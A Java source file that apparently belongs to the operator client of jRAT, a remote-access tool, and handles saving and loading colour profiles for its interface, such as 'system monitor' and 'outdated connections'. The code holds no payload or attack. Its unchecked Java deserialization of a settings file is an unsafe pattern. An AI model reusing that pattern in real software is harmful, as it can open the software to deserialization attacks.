package io.jrat.client.settings;

import io.jrat.client.io.Files;
import io.jrat.client.ui.components.JColorBox;

import java.awt.Color;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.HashMap;
import java.util.Map;


public class Colors extends AbstractSettings implements Serializable {

	private static final long serialVersionUID = 973106735935668990L;

	private transient Map<String, ColorProfile> colors = new HashMap<String, ColorProfile>();

	private static final Colors instance = new Colors();

	public static Colors getGlobal() {
		return instance;
	}

	@Override
	@SuppressWarnings("unchecked")
	public void load() throws Exception {
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(getFile()));
		colors = (HashMap<String, ColorProfile>) in.readObject();
		in.close();
		if (colors.size() == 0) {
			putDefault();
		}
	}

	@Override
	public void save() throws Exception {
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(getFile()));
		out.writeObject(colors);
		out.close();
	}

	public void put(String str, ColorProfile col) {
		colors.put(str, col);
	}

	public ColorProfile get(String str) {
		ColorProfile profile = colors.get(str);

		if (profile == null) {
			return generate("red");
		}

		return profile;
	}

	public Color getColorFromIndex(int index) {
		return getColorFromString(JColorBox.colors[index]);
	}

	public Color getColorFromString(String text) {
		Color color;
		if (text.equals("dark green")) {
			color = Color.green.darker();
		} else {
			try {
				color = (Color) Class.forName("java.awt.Color").getField(text).get(null);
			} catch (Exception e) {
				color = null;
			}
		}
		return color;
	}

	public void putDefault() {
		colors.clear();
		Colors.getGlobal();
		colors.put("system monitor", Colors.generate("blue"));
		Colors.getGlobal();
		colors.put("outdated connections", Colors.generate("red"));
	}

	public class ColorProfile implements Serializable {

		private static final long serialVersionUID = 7819760998736045294L;

		private int index;

		public int getIndex() {
			return index;
		}

		public void setIndex(int index) {
			this.index = index;
		}
	}

	public static ColorProfile generate(String color) {
		ColorProfile profile = Colors.getGlobal().new ColorProfile();
		for (int i = 0; i < JColorBox.colors.length; i++) {
			if (color.equalsIgnoreCase(JColorBox.colors[i])) {
				profile.setIndex(i);
				break;
			}
		}
		return profile;
	}

	@Override
	public File getFile() {
		return new File(Files.getSettings(), ".colors");
	}
}